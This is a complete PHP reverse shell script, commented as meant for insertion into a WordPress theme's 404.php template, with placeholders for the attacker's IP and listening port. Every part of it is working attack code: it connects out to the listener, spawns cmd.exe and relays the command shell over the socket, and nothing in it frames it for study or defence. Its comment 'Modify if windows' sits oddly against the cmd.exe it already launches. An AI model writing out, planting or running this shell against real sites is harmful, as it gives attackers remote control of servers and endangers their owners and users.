<?php
// Reverse shell for WordPress 404.php template
set_time_limit(0);
error_reporting(0);

$ip = '10.10.14.2';  // CHANGE THIS TO YOUR IP
$port = 4444;         // CHANGE THIS TO YOUR LISTENING PORT

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    die("$errstr ($errno)");
}

$descriptorspec = array(
    0 => array("pipe", "r"),
    1 => array("pipe", "w"),
    2 => array("pipe", "w")
);

$process = proc_open('cmd.exe', $descriptorspec, $pipes); // Modify if windows

if (is_resource($process)) {
    stream_set_blocking($pipes[0], 0);
    stream_set_blocking($pipes[1], 0);
    stream_set_blocking($pipes[2], 0);

    while (true) {
        if (feof($sock)) break;
        if (feof($pipes[1])) break;

        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $except_a, null);

        if (in_array($sock, $read_a)) {
            $input = fread($sock, 1024);
            fwrite($pipes[0], $input);
        }

        if (in_array($pipes[1], $read_a)) {
            $input = fread($pipes[1], 1024);
            fwrite($sock, $input);
        }

        if (in_array($pipes[2], $read_a)) {
            $input = fread($pipes[2], 1024);
            fwrite($sock, $input);
        }
    }

    fclose($sock);
    proc_close($process);
}
?>
